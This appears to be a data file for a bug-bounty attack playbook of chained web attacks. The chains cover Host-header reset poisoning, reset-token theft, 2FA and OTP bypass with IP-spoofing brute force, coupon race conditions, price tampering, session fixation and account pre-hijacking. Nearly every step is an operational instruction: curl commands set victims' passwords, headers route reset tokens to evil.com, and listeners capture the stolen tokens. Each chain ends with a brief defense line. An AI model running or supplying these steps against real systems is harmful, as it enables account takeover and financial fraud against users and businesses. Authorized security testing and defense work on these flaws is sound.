chains.title: Password reset: poisoning via the Host header
chains.impact: Full account takeover by stealing the victim's reset token (higher on large programs).
chains.why: A single header swap turns a public reset form into token theft.
chains.precondition: The application builds the reset link from a request header (Host / X-Forwarded-Host), and the victim will click the link from the email.
chains.realWorld: PortSwigger lab 'Password reset poisoning via middleware'; GHSA advisories for Kanboard/MasaCMS on the Host header.
chains.defense: Build links from a server-side base URL via an allowlist; never trust Host / X-Forwarded-Host.

steps.title: Map the reset flow
steps.detail: intercept POST /forgot-password with email=you@target.com in Burp; locate the reset link inside the received email

steps.title: Swap the Host header
steps.detail: change Host: target.com to Host: evil.com, resend, check if the email link host changed (test on your own account first)
steps.success: the link host in the email changed to evil.com

steps.title: Iterate header variants
steps.detail: X-Forwarded-Host: evil.com / duplicate Host headers / Host: target.com:80@evil.com / absolute-URI in request line

steps.title: Fallback via dangling-markup
steps.detail: when only partly injectable: X-Forwarded-Host: target.com?evil.com so the token rides to you as a query param

steps.title: Hit the victim
steps.detail: submit reset for email={USER_B} with the poisoned header; victim now receives a booby-trapped link

steps.title: Capture the token
steps.detail: run a listener (python3 -m http.server / Burp Collaborator / interactsh) and read the token from the path or Referer when the victim clicks

steps.title: Take over the account
steps.detail: curl -s 'https://target.com/reset-password?token=<captured>' -d 'password=Hacked123!' ; then log in
steps.success: 200 and login with the new password

chains.title: Password reset: token leakage and predictability
chains.impact: Account takeover, often with no victim interaction.
chains.why: The reset token is the password itself: if it leaks or is predictable, the account is yours.
chains.precondition: The application issues a reset token by email, and you can observe your own flow and reset response.
chains.realWorld: General technique; typical HackerOne ATO reports via the reset token; PortSwigger authentication labs.
chains.defense: A 128-bit random single-use token, short TTL, binding to the account, plus Referrer-Policy: no-referrer on the reset page.

steps.title: Inspect your own reset response
steps.detail: POST /forgot-password, then read the JSON/HTML body and Location header for token / resetToken / code / otp

steps.title: Token straight in the response body
steps.detail: if the response (or a GET /reset?email= probe) returns the token, request it for the victim's email and read it directly
steps.success: token is visible in the response for another user's email

steps.title: Leak via Referer
steps.detail: open the reset page; if it loads analytics/3rd-party scripts, the token in the URL leaks via the Referer header (check DevTools Network) and lands in their logs

steps.title: Predictable or sequential token
steps.detail: pull several tokens back-to-back, diff them, test UUIDv1 / timestamp / md5(email) / incrementing id, then reproduce the victim's offline

steps.title: Reuse, no expiry, no binding
steps.detail: reuse an old token, use it twice, or confirm it is not tied to the requesting session

steps.title: Step or response manipulation
steps.detail: skip a multi-step reset straight to POST /reset-password, or flip a verify response {"otpValid":false} to true to reach the set-password screen

steps.title: Set the victim's password
steps.detail: curl -s https://target.com/reset-password -d 'email={USER_B}&token=<derived>&password=Hacked123!'

chains.title: Takeover via profile email change
chains.impact: Full takeover of the target account.
chains.why: Whoever owns the linked email owns every future reset, which makes the email field a true crown jewel.
chains.precondition: The application allows changing the account email under weak verification or a client-side check.
chains.realWorld: General technique; regular HackerOne ATO reports via unverified email change.
chains.defense: Require the current password and step-up, send a notification and confirmation to the OLD address, keep multi-step flow state on the server.

steps.title: Map the email change
steps.detail: POST /account/email with email=new@evil.com; note whether it demands the current password or a confirm step

steps.title: No re-authentication
steps.detail: change email with no current-password check; chain with CSRF/clickjacking on this endpoint for cross-user impact

steps.title: Status spoofing in the response
steps.detail: if a confirm step returns {"verified":false} or 403, intercept the response and change it to true / 200 to force-confirm

steps.title: Skip the confirmation step
steps.detail: replay the final success request / POST /account/email/confirm directly without completing email confirmation

steps.title: Unverified recovery email
steps.detail: if an unverified secondary/recovery email is accepted, add @evil.com as recovery and reset through it

steps.title: Pivot to full takeover
steps.detail: curl -s https://target.com/forgot-password -d 'email={EMAIL}' ; capture token and log in

chains.title: 2FA/OTP bypass at the logic level
chains.impact: Full MFA bypass given stolen or your own credentials.
chains.why: Logic flaws in MFA are everywhere and pay well, since they break the last line of defense.
chains.precondition: You have a valid username+password pair, and a 2FA prompt stands between you and the account.
chains.realWorld: PortSwigger labs '2FA simple bypass' and '2FA broken logic'.
chains.defense: Verify 2FA on the server bound to the authenticating session, single-use codes, don't trust client-supplied status.

steps.title: Map the 2FA step
steps.detail: after the password step capture POST /login2 (mfa-code=) and any identity field like verify= / username=

steps.title: Skip the step itself
steps.detail: finish the password step, then request a post-2FA page directly (GET /my-account); if it loads, 2FA is not enforced server-side

steps.title: Status spoofing in the response
steps.detail: submit a wrong code, intercept the response, change {"success":false}/401 to true/200 or follow the 302 to the authenticated page

steps.title: Flaw in victim binding
steps.detail: log in with YOUR creds to reach 2FA, then set verify=carlos so a code is issued for the victim, and submit/brute against them

steps.title: Code reuse
steps.detail: reuse a prior valid OTP, or replay the same code across sessions; confirm old codes still verify

steps.title: Abuse of backup codes
steps.detail: hit /2fa/backup-code with no throttle or short/enumerable codes, or disable 2FA via the recovery flow

steps.title: Confirm the session
steps.detail: curl -s https://target.com/my-account -H 'Cookie: session=<post-login>' ; session cookie is now fully privileged
steps.success: the account page is served as if logged in

chains.title: OTP brute-force via rate-limit bypass
chains.impact: Brute-forcing a 2FA or reset OTP straight to takeover.
chains.why: 4-6 digit codes die instantly once throttling is broken, which makes this the most reusable bypass in the game.
chains.precondition: A numeric OTP/2FA/reset code under a weak or bypassable rate limit.
chains.realWorld: PortSwigger lab '2FA bypass using a brute-force attack'; classic rate-limit bypass reports via X-Forwarded-For.
chains.defense: Rate-limit per account+code pair on the server (not per IP/header), lock out after N attempts, OTP expiry and rotation, CAPTCHA.

steps.title: Find the throttling
steps.detail: fire 10-20 wrong codes at POST /verify and watch for 429 / lockout / CAPTCHA; note exactly what trips it

steps.title: Spoof the source IP
steps.detail: rotate X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / X-Originating-IP per request (1.1.1.1, 1.1.1.2 ...)

steps.title: Case, encoding, and path tricks
steps.detail: alter method/path case, add a trailing / or %00 or ?x=1 or change Content-Type to dodge a path-keyed limiter

steps.title: Reset the counter
steps.detail: re-request a fresh OTP between batches if the counter resets per code, or null-byte the value as 0000%00

steps.title: Beat the limiter with a race
steps.detail: single-packet 20-30 guesses inside one window (gate='race1') to slip extra attempts past a per-time-window throttle

steps.title: Brute-force via Turbo Intruder
steps.q: otp_brute.py - OTP/2FA brute-force with rate-limit bypass
steps.detail: iterate 0000-9999 across rotated IPs, concurrentConnections=30, success marker = 302 / Set-Cookie / response-length change

steps.title: Take over
steps.detail: curl -s https://target.com/verify -H 'X-Forwarded-For: 1.2.3.4' -d 'mfa-code=<hit>' ; authenticated session issued

chains.title: Checkout race: coupons and limits via single-packet
chains.impact: Reusing one-time coupons/gift cards, balance overspend, bypassing per-account limits; direct money.
chains.why: The flagship money bug of our time, where parallel requests beat almost any naive 'already used?' check.
chains.precondition: A server-side action protected by a check-then-act scheme over shared state (coupon used? balance? stock? claimed?).
chains.realWorld: PortSwigger research 'Smashing the state machine' and 'The single-packet attack' (James Kettle, 2023).
chains.defense: Atomic DB constraints, SELECT ... FOR UPDATE, a unique index on (coupon,user), idempotency keys, no check-then-act.

steps.title: Find the limited action
steps.detail: one-time coupon POST /cart/coupon code=SAVE90, gift-card redeem, '1 per account' claim, or withdraw/transfer

steps.title: Baseline single attempt
steps.detail: apply once legitimately and confirm the second attempt is rejected ('already used')

steps.title: Assemble the race in Repeater
steps.detail: add 20-50 identical requests to a tab group and choose 'Send group in parallel (single-packet attack)' over HTTP/2

steps.title: Turbo Intruder variant
steps.detail: race-single-packet-attack.py: engine.queue(target.req, gate='race1') x30 then engine.openGate('race1')

steps.title: Read the overspend
steps.detail: success = coupon applied multiple times / balance reduced once for many redemptions / stock goes negative
steps.success: coupon applied N times or stock went negative

steps.title: Lock in the profit
steps.detail: curl ... /checkout after looping the discount to drive cart total toward 0 (or inflate balance)

chains.title: Price, quantity, and currency manipulation
chains.impact: Buying for free or next to nothing, or minting store credit via refunds.
chains.why: The original business-logic classic: if the client sends the price, the client sets the price.
chains.precondition: The cart, checkout, or API trusts the client-supplied price, quantity, or currency.
chains.realWorld: General technique (OWASP business-logic testing; classic price-tampering reports in e-commerce).
chains.defense: Compute price and total on the server from the product ID, validate the currency and reject negative quantities, ignore the client-supplied total.

steps.title: Capture add-to-cart and checkout
steps.detail: hunt the body/JSON for price= / amount= / unit_price= / currency= / qty= / total=

steps.title: Tamper with the price
steps.detail: set price=1 (or 0.01), proceed to pay, confirm the charged amount equals the tampered value
steps.success: exactly the tampered value is charged

steps.title: Negative quantity or value
steps.detail: qty=-1 or amount=-100 to credit yourself or push the total below zero (refund / store-credit abuse)

steps.title: Currency swap
steps.detail: change currency=USD to a low-value unit so '100' costs a fraction while goods/credit stay valued in the original

steps.title: Discount stacking
steps.detail: send multiple coupon= params, set percent=100, or re-add a removed discount via a tampered request

steps.title: Rounding and precision abuse
steps.detail: tiny decimals (0.000001) or large item counts to exploit float rounding and underpay

steps.title: Confirm the order
steps.detail: curl ... /checkout then verify the order total and actual charge reflect the manipulation, not the catalog price

chains.title: Session fixation: hijacking an authenticated session
chains.why: A textbook session bug that still survives wherever an application doesn't rotate the session ID on login.
chains.precondition: The application accepts an attacker-imposed session token and does NOT reissue it after authentication.
chains.realWorld: OWASP Session Fixation; PortSwigger materials on session management.
chains.defense: Reissue the session ID on every privilege change (login), reject client-supplied IDs, set HttpOnly/Secure/SameSite.

steps.title: Observe session handling
steps.detail: note the cookie (PHPSESSID / JSESSIONID / session) before login and check if its value changes after login

steps.title: Confirm the lack of rotation
steps.detail: log in; if the pre-login cookie value is still valid afterward, the ID is fixable
steps.success: the pre-login cookie value stays valid after login

steps.title: Obtain a known ID
steps.detail: grab an anonymous session, or set one via an accepted param/cookie (?sessionid=ATTACKER)

steps.title: Impose it on the victim
steps.detail: deliver the fixed session via a crafted link / XSS / Set-Cookie injection so the victim browses with your chosen ID

steps.title: The victim authenticates
steps.detail: victim logs in under the attacker-known ID, which is now privileged

steps.title: Ride their session
steps.detail: curl -s https://target.com/my-account -H 'Cookie: session=ATTACKER' ; open as the victim
steps.success: the victim's content under the fixed ID

chains.title: Email verification bypass and pre-account-takeover
chains.impact: Access to 'verified-only' features or silent takeover of accounts created later.
chains.why: Registration is the softest entry point, and email pre-hijacking or self-verification silently compromise future accounts.
chains.precondition: The application ties identity or features to an email verification step that can be skipped or pre-empted.
chains.realWorld: The pre-hijacking research (Sudhodanan and Paverd, 2022); typical email verification bypass reports.
chains.defense: Require verification before any account use, atomic uniqueness of the verified email, address canonicalization, forbid pre-hijacking of unverified addresses.

steps.title: Map registration and verification
steps.detail: POST /register then GET/POST /verify-email?token=; note what 'verified' unlocks

steps.title: Skip verification
steps.detail: log in right after POST /register; if GET /dashboard loads unverified, the gate is client-side only

steps.title: Spoof the verification response
steps.detail: intercept the verify response and change emailVerified:0 / {"verified":false} to 1 / true

steps.title: Token self-verification
steps.detail: if the verification token is returned in the signup response or is predictable, confirm any email without inbox access

steps.title: Pre-hijack the victim's email
steps.detail: register {USER_B} (unverified) before they do; when they later sign up or join via SSO/OAuth the app may merge into your account

steps.title: Confusion via aliases and case
steps.detail: register Victim@target.com, victim+x@, or a trailing-space/Unicode variant to collide with the real account on a normalizing backend

steps.title: Inherit the account
steps.detail: curl -s https://target.com/login -d 'email={USER_B}&password=<your-original>' after the merge/normalization
steps.success: login into the victim's linked account
